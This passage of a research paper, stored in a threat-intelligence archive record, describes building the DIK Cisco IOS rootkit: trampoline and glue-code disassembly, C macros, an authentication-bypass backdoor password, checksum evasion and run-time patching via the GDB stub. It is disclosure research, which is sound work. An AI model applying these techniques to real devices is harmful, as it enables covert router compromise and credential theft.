called\n_trampoline and will redirect the execution flow to a location known_\nas glue code.\n\nPage 23 of 37\n\n\n-----\n\nThe trampoline is responsible for jumping immediately (and\nunconditionally) to attacker-specific code that will make some stack\narrangements based on a previously known number of parameters to be\npassed to the rootkit function and ultimately call the appropriate\nfunction in the rootkit code.\n\nThe glue code is responsible for the following:\n\n1. Saving the return address. Due to the fact that the code from\n\nthe trampoline 'jumped' to the glue code, this is the address of\nthe instruction following the one that called the original IOS\nfunction.\n\n2. Storing the function parameters currently allocated in processor\n\nregisters into the stack.\n\n3. Allocating space on the stack for an extra function parameter\n\nneeded by the rootkit C code.\n\n4. Calling the rootkit plain C code.\n\n5. Processing the return value of the rootkit C code to decide\n\nwhether to continue the execution of the original IOS function\nor return directly to the caller.\n\n6. If the execution of the original function must continue, then\n\nthe original function call parameters stored in the stack are\nrestored, the overwritten instructions from the original IOS\nfunction are executed, and finally a jump to the instruction\nnext to the trampoline is performed.\n\n7. If the execution of the original function must not be performed,\n\nthe value at the memory allocated for the extra parameter is\ncopied into the register that contains the return value of the\noriginal function followed by a jump to the return address\nstored in step number one.\n\nThis high level explanation is intended to briefly explain the\nfunctionality of the glue code and to express that it is a vital part\nof the bridge that communicates the original IOS functions (now\nsubverted) with the counterpart rootkit functions written in plain C.\n\nThe beginning of the function, which was previously detected using\nstrings references (from neighbors or itself) is located using IDA,\nhad its prologue overwritten with the trampoline code.\n\nPage 24 of 37\n\n\n-----\n\nThis is a common technique known as hooking and consists of\nintercepting a function call by redirecting the code execution to the\nrootkit code for further processing and then returning to the\noriginal point.\n\nBelow is a high-level graphic explaining the execution path until it\nreaches the rootkit code and how the information is processed:\n\nIOS caller       chk_pass (p)       Glue code        chk_pass_DIK(p,i)\n+-----------------+  +-----------------+   +----------------------+   +-----------------+\n|         |  |         |   |           |   |         |\n| r = chk_pass(p) |-1->| trampoline   |--2->| add stack      | 3-->| if p == 'l337': |\n|         |  |         |   | store parent RA   | |  | i = true    |\n| if r == true:  |<- | rest of code  |<-+ | store params p    | | +-| return RET   |\n| login()    | | | ...       | | | create param i    | | | | else:      |\n| else:      | +--| return legal_res| 5 | o = chk_pass_DIK(p,i)|-+ |-| return CONT  |\n| deny_login()  | | |         | | | fix stack      |<--4 |         |\n| ...       | | |         | | | if o == CONT:    |   |         |\n+-----------------+ | +-----------------+ | | exec orig instruct |   +-----------------+\n|            +--| return params p   |\n|             | cont chk_pass_IOS  |\n|             | else:        |\n+-------<----6---<---------| r = i        |\n| jump to RA     |\n|           |\n+----------------------+\n\nIn the following example, the IOS function responsible for password\nchecking is hooked and based on the result (whether the password is a\nbackdoor password or not), the execution flow is redirected again to\neither invoke the original function code or to return directly to the\ncaller (bypassing authentication) as explained below:\n\n1. A function inside the IOS calls the password validation function\n\ncall chk_pass(). At the beginning of this function, using the\nhooking technique to apply the trampoline's code, the rootkit\nseizes control of the execution flow.\nIn the case of the PowerPC we simply write a branch instruction\n(b) like the following:\n\n.text:803B79B4 48 DC C3 9C  b    loc_81183D50\n\nThe next example covers the case of the MIPS architecture where\na jump instruction (j) will be written at the function prologue,\nfollowed by a NOP instruction to avoid problems with delay-slots\non this architecture:\n\nPage 25 of 37\n\n\n-----\n\nThis is the motive why in IOS, with images for MIPS\narchitecture, two instructions on the prologue are overwritten.\n\n2. The glue code is invoked so that the steps previously explained\n\ntake place. Now a detailed explanation of the shellcode used\nwill be shown for calling a function that expects four\nparameters, three of which are the original function's\nparameters, and the fourth parameter is the return value (this\nvalue is ignored by the shellcode if the function doesn't return\nany value, like in the case of void functions).\n\nFollowing is a complete disassembly of the glue code for the\nPowerPC architecture:\n\n.data:81183D50  loc_81183D50:\n.data:81183D50 mflr  %r0       ; Save return address\n.data:81183D54 stw   %r0, -4(%sp)  ; Copy ret addr into stack\n.data:81183D58 stw   %r3, -0xC(%sp) ; Store param 1\n.data:81183D5C stw   %r4, -0x10(%sp) ; Store param 2\n.data:81183D60 stw   %r5, -0x14(%sp) ; Store param 3\n.data:81183D64 addi  %r6, %sp, -8  ; Get address of param 4\n.data:81183D68 stwu  %sp, -0x1C(%sp) ; Save stack space for params\n.data:81183D6C bl   sub_81183BB4  ; Invoke DIK plain C code\n.data:81183D70 addi  %sp, %sp, 0x1C ; Restore allocated stack\n.data:81183D74 cmpwi  %r3, 0     ; Check if RETURN to caller\n.data:81183D78 lwz   %r3, -4(%sp)  ; Obtain ret address stored\n.data:81183D7C mtlr  %r3       ; Copy ret addr to register\n.data:81183D80 beq   loc_81183D98_RET; Exec RETURN or CONT code?\n.data:81183D84 lwz   %r3, -0xC(%sp) ; Restore original param 1\n.data:81183D88 lwz   %r4, -0x10(%sp) ; Restore original param 2\n.data:81183D8C lwz   %r5, -0x14(%sp) ; Restore original param 3\n.data:81183D90 stwu  %sp, -0x18(%sp) ; Execute overwritten inst\n.data:81183D94 b    loc_803B79B8  ; Continue after trampoline\n------------------------------------------------------------------.data:81183D98\n.data:81183D98  loc_81183D98_RET:  # CODE XREF: .data:81183D80#j\n.data:81183D98 lwz   %r3, -8(%sp)  ; Set function return value\n.data:81183D9C blr           ; Return to IOS caller\n\nThe comments next to every instruction in the above disassembly\nrepresent the step previously described when the glue code was\nfirst introduced.\n\nPage 26 of 37\n\n\n-----\n\nIt's important to remind readers at this point that the part of\nthis shellcode that stores/restores the original function\nparameters was dynamically calculated by the IDA-Python script.\n\nIt's also worth mentioning that the compiled rootkit code, which\nwas placed in memory that originally belonged to a debug string,\nwas successfully executed allowing the attacker to achieve one\nof the most important parts of this rootkit -- which is to\nmaintain a unique code base written in plain C that works for\nboth platforms without having to take care of architecturespecific details.\n\nThe MIPS code performs the same task as the PowerPC code but\nwith the corresponding MIPS instructions:\n\nDATA:616952EC loc_616952EC:\nDATA:616952EC sw   $ra, -4($sp)   ; Copy ret addr into stack\nDATA:616952F0 sw   $a0, -0xC($sp)  ; Store param 1\nDATA:616952F4 sw   $a1, -0x10($sp) ; Store param 2\nDATA:616952F8 sw   $a2, -0x14($sp) ; Store param 3\nDATA:616952FC addi  $a3, $sp, 0xFFF8 ; Get address of param 4\nDATA:61695300 addiu  $sp, -0x1C    ; Save stack space for params\nDATA:61695304 jal   sub_61695164   ; Invoke DIK plain C code\nDATA:61695308 nop           ; nop for delay-slot\nDATA:6169530C addiu  $sp, 0x1C    ; Restore allocated stack\nDATA:61695310 lw   $ra, -4($sp)   ; Obtain ret address stored\nDATA:61695314 beqz  $v0, loc_61695338; Exec RETURN or CONT code?\nDATA:61695318 nop           ; nop for delay-slot\nDATA:6169531C lw   $a0, -0xC($sp)  ; Restore original param 1\nDATA:61695320 lw   $a1, -0x10($sp) ; Restore original param 2\nDATA:61695324 lw   $a2, -0x14($sp) ; Restore original param 3\nDATA:61695328 addiu  $sp, -0x28    ; Execute 1[st] overwritten inst\nDATA:6169532C sw   $s0, 0x18($sp)  ; Execute 2[nd] overwritten inst\nDATA:61695330 j    loc_60460A0C   ; Continue after trampoline\nDATA:61695334 nop           ; nop for delay-slot\n------------------------------------------------------------------DATA:61695338\nDATA:61695338 loc_61695338:      # CODE XREF: DATA:61695314#j\nDATA:61695338 lw   $v0, -8($sp)   ; Set function return value\nDATA:6169533C jr   $ra       ; Return to IOS caller\nDATA:61695340 nop           ; nop for delay-slot\n\nIt's also important to note that the address where the glue code\nstarts is at the end of the rootkit code, so all the code is put\ntogether in the same memory area (and hopefully the same memory\npage).\n\nPage 27 of 37\n\n\n-----\n\nIn the scenario described above it is possible to describe the tasks\nperformed by the glue code by saying that it stores the return\naddress of the original function call, calls the rootkit function\nwith the same arguments of the IOS legitimate function, and processes\nthe result of the function call.\n\nThis result is needed to determine if execution flow will return to\nthe instruction following the trampoline and continue the original\npath by executing the instructions that were overwritten with the\ntrampoline (in case that the password entered is not the rootkit\npassword), or return directly to the trampoline's caller because no\nmore password validation is needed (in case the password entered is\nthe rootkit’s master password), which means that the attacker is\nlogging in.\n\nThe glue code is crucial for rootkit operations because some of those\npainful steps might not be necessary if the rootkit code was\nimplemented in pure assembly. In the case of DIK it was implemented\nin plain C to allow easy maintenance.\n\nNow it's clear why those few lines of special assembly instructions\ncalled trampoline and glue code were needed to fill the gap between a\nC function compiled (with Position Independent Code) for the target\narchitecture and extracted to be inserted 'as is' directly inside the\nIOS image.\n\nThe advantage of this method is that only one C code is maintained\n(with certain limitations, of course) instead of two assembly codes\nthat perform the same actions on different architectures (a MIPS code\nand a PowerPC code).\n\n**Learning the a, b, (plain) C**\n\nThe rootkit code will change according to the needs of the attacker,\nwhich may include hiding files, hiding connections, maintaining\nbackdoors, cleaning logs, etc. -- all of them providing a complete\nstealth operation during an attacker's visit.\n\nThose features will take form of C functions and once those\nfunctions’ code is compiled, their bytes will be needed so they can\nbe inserted into the IOS image. But a problem arises because the\ncompiled code is an ELF file for the target architecture and this is\nwhere the flags (BOF_and EOF_) -- mentioned in the 'rootkit address\nbook' section (the dump sample included those flags) -- will be used\nto separate the bytes of interest for the attacker from the rest of\n\nPage 28 of 37\n\n\n-----\n\nthe ELF file.\n\nThose flags are just inline assembly markers like the following:\n\n#define BOF_DIK_CODE  asm(\".ascii \\\"BOF_\\\"\")\n#define EOF_DIK_CODE  asm(\".ascii \\\"EOF_\\\"\")\n\nThose two markers were placed at the beginning and at the end of a\nsource code file (always outside of existing functions) so the\ncompiler simply includes them and then a Python script can take\nadvantage of this to delimit the necessary code for the rootkit.\n\nThe rootkit also required that the strings were in the same section\nof the code instead of different sections like they usually are\n(.TEXT) so a way to include them next to the functions and a way to\nobtain their addresses (and that those addresses support PIC –\nPosition Independent Code) was absolutely necessary. Otherwise the\nrootkit wouldn't have strings support and that's not acceptable.\n\nTo address this issue, inline assembly was employed to put the raw\nstrings beside a function and then obtain the pointer to those\nstrings through this function using a shellcode that resolves the\ncurrent function address (to allow PIC) and then adds an offset which\nis architecture specific.\n\nThe idea was to create a function that contained the string and also\nthe shellcode to return its memory address (like a char*) so the\nfollowing steps were needed:\n\nvoid pszPassword(void)          // String pointer name\n{\n\n1. Code that obtains current PC.\n2. Store PC into a variable.\n3. Add an offset (to point to inline asm instruction) to point to\n\nfunction's end.\n4. Return the variable pointing to end of function(string begins\n\nthere).\n}\nasm(\".ascii \\\"my backdoor password\\\");  // Our string\nasm(\".byte 0\");             // Null terminator\n\nWith this schema, a macro was created to reference the function\naddress plus an offset (which is architecture specific) to avoid the\nfunction's code until the end of the first byte after the epilogue.\n\nPage 29 of 37\n\n\n-----\n\nThe epilogue length varies between architectures so we determine the\ncurrent working architecture using GCC internal definitions to obtain\nthe correct offset value.\n\nThe fully functional macros for both PowerPC and MIPS are shown\nbelow in a macro called STRING_DEFINE.\n\n#ifdef __mips__\n#define _OFFSET 0x30\n#elif __PPC__\n#define _OFFSET 0x34\n#endif\n\n#elif __mips__\n#define STRING_DEFINE(name,content)  char* name(void)      \\\n{              \\\nint ret = 0;      \\\nint orig_blr;      \\\nasm(\"move %0, $ra\"   \\\n:\"=r\"(orig_blr));  \\\nasm(\"nop\");       \\\nasm(\"bal +4;\");     \\\nasm(\"move %0, $ra\"   \\\n:\"=r\"(ret));    \\\nasm(\"move $ra, %0\"   \\\n::\"r\"(orig_blr));  \\\nreturn(char*)ret+_OFFSET;\\\n}              \\\nasm(\".ascii \\\"\"content\"\\\"\");\\\nasm(\".byte 0\");\n#elif __PPC__\n#define STRING_DEFINE(name,content)  char* name(void)      \\\n{              \\\nint ret;        \\\nint orig_blr;      \\\nasm(\"mflr %r8;\");    \\\nasm(\"mr %0, %%r8\"    \\\n:\"=r\"(orig_blr));  \\\nasm(\"bl +4;\");     \\\nasm(\"mflr %r8;\");    \\\nasm(\"mr %0, %%r8\"    \\\n:\"=r\"(ret));    \\\nasm(\"mr %%r8, %0\"    \\\n::\"r\"(orig_blr));  \\\nasm(\"mtlr %r8;\");    \\\nreturn (char*)ret+_OFFSET;\\\n\nPage 30 of 37\n\n\n-----\n\nThis macro takes two parameters, the first is the pointer name\n(function name) and the second is the content (the string itself).\nSo, to use it refer to that string (get a pointer to it) like any\nother string.\n\nA small detail is that \"naked\" attribute is not available for those\ntarget architectures and that is why the offset stuff to avoid the\nprologue is needed. Otherwise the function prologue and epilogue\nwouldn't be included by the compiler.\n\nBelow is an example of usage of the string macro:\n\nSTRING_DEFINE(pszPassword, \"dik_rulez\")\n\nvoid myRootkitFunction(int somearg)\n{\nchar* pszPass = pszPassword();  // Function name as string pointer\n// or\nprintf(\"Password = %s\", pszPassword()); // common pointer usage\n}\n\nWith the string issue solved, the rest of the rootkit code is simply\na plain C program like any other and the only thing to keep in mind\nis that the rootkit's functions must follow a few rules.\n\nThese rules are that rootkit functions must return an integer to\nindicate to the glue code, whether to continue execution of the\noriginal IOS function, or return to the caller -- and also must\ninclude one parameter more than the original IOS function which will\ncontain the return value of the original IOS function in case\nreturning to the caller is needed.\n\nuint chk_pass_DIK(char *input,char *correct,uint val,uint* hook_res)\n{\n// my_strcmp is also a rootkit function\nif (my_strcmp(input, pszPassword()) == 0)\n{\n*hook_result = 1; // master password specified\nreturn OP_RETURN;\n}\n\nPage 31 of 37\n\n\n-----\n\nIn the above example, the usage of a function to return a string\npointer is shown, as well as invoking another rootkit function (in\nthis case is my_strcmp function).\n\nIt is clear at this point that the rootkit functionality is only\nlimited by the attacker's creativity because it's like programming\nanything else in C.\n\n**Functioning without the others functions**\n\nA function that performs password checking is useful to retrieve\nother users’ passwords in plain text and if this information could be\nwritten somewhere (may be a hidden file on flash file system) or\ntransmitted over a TCP connection using IOS socket handling\ncapabilities, would be of great interest for an attacker.\n\nThere are several functions besides the one mentioned above that a\nrootkit must hook/patch to take complete control of the system.\n\nThose functions include equivalents of file-handling functions like\nread/write, socket handling like send/recv, and IOS functions that\nimplement the CLI (Command Line Interface) commands that can alert\nthe system administrator of unauthorized access.\n\nPointers to those functions need to be used from the C rootkit code\nto be able to employ them into the rootkit code.\n\nThis could be done by creating stub functions in the C code that\ncontain a jump to the function's location inside, but this location\nwill only be resolved after analyzing the IOS image with IDA.\n\nTo solve this problem, the stubs function could be created in the\ncode containing a call to an index inside a jump table which could be\nfilled by a Python script with the address of the real function in\nmemory.\n\nModern compilers use this approach to dynamically resolve the\naddresses of library functions referenced by a user program, which at\ncompile time are unknown to the compiler/linker and become known when\nthe program is executed and the jump table is filled with the\n\nPage 32 of 37\n\n\n-----\n\nresolved (current) memory addresses.\n\nBeing able to use IOS internal functions gives the rootkit a more\nadvanced level of stealth, and allows for capabilities that go far\nbeyond simple function hooking.\n\nFor example, normal security procedures like downloading the IOS\nimage in a periodic manner by the system administrator to perform a\nchecksum (like MD5, SHA1, etc.) as part of the company security\nprocess to detect modified images could be easily redirected to an\nexternal server that contains an unaltered image without any\nsuspicion.\n\nIt could even intercept the read function calls asking for a chunk of\nthe compressed image on flash (or any other media) and in that moment\nit decompresses the infected chunk, patches it with the original\nbytes (which were previously stored on a file in the flash file\nsystem -- assuming that those functions addresses are known by\nprevious analysis) and re-compress it so it's returned intact (this\nis possible since the compression algorithm can work with chunks of\nbytes instead of the entire file).\n\nAt this moment, the difference between a low level rootkit and a\nsimple TCL script can be appreciated because such actions like the\none mentioned above could never be achieved by a higher level\nrootkit.\n\nOne important feature of the rootkit is that the hooking method\ndoesn't need any additional process running to perform those actions,\nso listing processes is not going to help for detection because all\nthat DIK does is intercept function calls and redirect execution flow\nto perform certain tasks and then continue at the address after the\nredirection takes place.\n\n**Ready, steady, go**\n\nWith the rootkit code in place, it's time to dump the newly-patched\nIOS image, repack it with the original (self decompressing) file\nheader and upload it to the target system.\n\nReading the patched IDA image and writing its content to a file can\nbe done easily, as in the following example:\n\nPage 33 of 37\n\n\n-----\n\nThis generated file will later be merged with the original IOS\nfilename to create the decompressed backdoored IOS image.\n\nNow details will be given about how to merge the ready rootkit code\nin the temporal file with the original IOS image -- because this is a\ntrivial byte replacement operation and the offsets to apply the patch\non the original image can be obtained from IDA.\n\nThe checksum of the patched IOS image must be calculated again\nbecause now that its content have changed the old checksum values\nwon't match.\n\nA script in Python that implements the checksum algorithm described\nat the beginning can be used to recalculate the checksum and recreate\nthe self decompressing IOS image using the original image header\n(from the first byte to the end of the SFX section) and obtain an\nimage ready to be uploaded to the device using a normal image upgrade\nprocedure.\n\n**Other ways of The Force**\n\nImage binary patching has been discussed in depth but a run-time\nmemory patching technique is also possible using the GDB[12] stub\nincluded inside every IOS image.\n\nThe GDB stub is the debugging interface for Cisco developers which\nallows them to debug IOS processes. It also allows remote image\ndiagnostics because it's capable of working over a Telnet session as\n\nPage 34 of 37\n\n\n-----\n\nwell as over a Serial session establish on the console port.\n\nThis GDB stub is capable of working in three different ways:\n\n  - Process examination: Allows memory inspection and processor\nregisters inspection but it cannot modify system values (memory\nof registers values).\nThe system execution continues normally during debugging so\n'examine' mode can be executed over a Telnet session.\n\n  - Process debugging: In the situations that a console port of the\ndevice is not accessible, process debug mode can be executed. It\nworks by catching unhandled exceptions on the specified process,\nsetting it in a special state where it will not be rescheduled\nand then running the process of the debugger to debug the failed\nprocess.\nThe IOS system continues to run during process debugging so it\nis possible to debug a process over a Telnet session but certain\nrestrictions apply. The scheduler, an interrupt service routine\nor any process needed for the debugging path (such as TCP/IP)\ncannot be debugged over this session.\nThis debugging mode is capable of memory and processor registers\nmodification so this is the best option for an attacker to\nremotely modify the device memory to insert the backdoor.\n\n  - Kernel debugging: If the attacker gains physical access to a\nconsole port he or she can execute the kernel debugger which is\nthe preferred way to debug a router. In this mode, the entire\ndevice execution is stopped during the exception, freezing all\nsystem states.\n\nUsing the Telnet connection, a remote GDB instance can be executed to\nperform memory patching but certain precautions must be taken, such\nas not writing the trampoline code before the rootkit code, because,\nif a patched function is invoked before the rootkit code is in place\na memory access violation will be raised leading to a system crash.\n\nAn attacker might want to automate this run-time patching procedure\nfor every system restart and it can be accomplished in a few\ndifferent ways. One possible way is to create a TCL script to execute\nat startup, engage a Telnet session with the local host and execute\nthe process debugger to patch the device it is running on.\n\nIn this case, the script must contain the rootkit code inside with\nthe memory locations to be modified -- which could have been\npreviously obtained by the same analysis phase involved in the image\nbinary patching procedure.\n\nPage 35 of 37\n\n\n-----\n\n## Conclusions\n\nA reliable and generic method for Cisco IOS image infection can be\nimplemented either via binary image modification or via run-time code\npatching.\n\nTo face this kind of threat the only possibility available today is\nto use CIR[13], a tool created by Felix 'FX' Lindner from Recurity\nLabs and presented early this year when he talked about developments\non IOS forensics[14].\n\nThe CIR analysis framework aims at identifying compromised routers,\nexploitation attempts and backdoors -- as well as process and memory\nanomalies.\n\nThe framework inspects a snapshot of the live IOS memory (core dump\nor GDB debug connection) and reconstructs the central data\nstructures, providing an abstraction layer for in-depth analysis\nmodules and reporting.\n\nIt's important to make a special mention of CIR because it's the ONLY\nserious (and possible) way to perform forensics on a Cisco device and\nit still might be complicated if the rootkit controls the core-dump\ngeneration routines. In that case, the CIR alternative methods like\nGDB debug connection should be used.\n\nUnless every system administrator plans on using advanced forensics\nmethods on every device on their networks like the one (and only)\nmentioned before, they should take serious security measures and try\nto keep the devices updated to minimize risks.\n\nEven this work may not be enough to detect an advanced rootkit\nalready deployed in the system, depending on the stealth level of the\nrootkit -- so, external methods of device compromise detection should\nbe conceived because relaying in a possible infected image is as bad\nas running antivirus in a computer already infected, and relaying in\nan OS that is already compromised.\n\nPage 36 of 37\n\n\n-----\n\n**References**\n\n[1] A free Python interpreter for Windows called ActivePython can be\nobtained at:\n[http://www.activestate.com/Products/activepython/features.plex](http://www.activestate.com/Products/activepython/features.plex)\n\n[2] Python for beginners\n[http://wiki.python.org/moin/BeginnersGuide](http://wiki.python.org/moin/BeginnersGuide)\n\n[3] IDA Pro disassembler and debugger\n[http://www.hex-rays.com/idapro/](http://www.hex-rays.com/idapro/)\n\n[4] IDAPython is a plug-in for IDA Pro to allow python scripts to be\nexecuted in the context of IDA and to access all of its functions. It\n[can be downloaded from http://d-dome.net/idapython](http://d-dome.net/idapython)\n\n[5] 'The ELF virus writing HOWTO'\n[http://www.linuxsecurity.com/resource_files/documentation/virus-](http://www.linuxsecurity.com/resource_files/documentation/virus-writing-HOWTO/_html/index.html)\n[writing-HOWTO/_html/index.html](http://www.linuxsecurity.com/resource_files/documentation/virus-writing-HOWTO/_html/index.html)\n\n[6] Daniel Hodson presentation at RUXCON 2004\n[http://www.ruxcon.org.au/files/2004/11-daniel_hodson.ppt](http://www.ruxcon.org.au/files/2004/11-daniel_hodson.ppt)\n\n[7] Download GCC (GNU Compiler Collection) at [http://gcc.gnu.org/](http://gcc.gnu.org/)\n\n[8] GCC cross compiler info at:\n[http://en.wikipedia.org/wiki/Cross_compiler](http://en.wikipedia.org/wiki/Cross_compiler)\n\n[9] PyElf is a simple library for easy ELF file manipulation. Refer\nto Core Security Technologies' site for news about it.\n\n[10] GNU Binutils can be obtained at :\n[http://www.gnu.org/software/binutils/binutils.html](http://www.gnu.org/software/binutils/binutils.html)\n\n[11] Information about the tool called objdump included in binutils\n[can be obtained at http://en.wikipedia.org/wiki/Objdump](http://en.wikipedia.org/wiki/Objdump)\n\n[12] GDB is The GNU Debugger Project and information about it can be\n[obtained from http://sourceware.org/gdb/](http://sourceware.org/gdb/)\n\n[13] CIR (Cisco Information Retrieval)\n[http://cir.recurity-labs.com/](http://cir.recurity-labs.com/)\n\n[14] 'Developments in IOS Forensics'\n\n[http://www.recurity- labs.com/content/pub/RecurityLabs_Developments_in_IOS_Forensics.pdf](http://www.recurity-labs.com/content/pub/RecurityLabs_Developments_in_IOS_Forensics.pdf)\n\nPage 37 of 37\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://drwho.virtadpt.net/images/killing_the_myth_of_cisco_ios_rootkits.pdf"
    ],
    "report_names": [
        "killing_the_myth_of_cisco_ios_rootkits.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1212680136,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/c92a770df6f0b3f4f698da4c84cb3cd32889413d.pdf",
        "text": "https://archive.orkl.eu/c92a770df6f0b3f4f698da4c84cb3cd32889413d.txt",
        "img": "https://archive.orkl.eu/c92a770df6f0b3f4f698da4c84cb3cd32889413d.jpg"
    }
}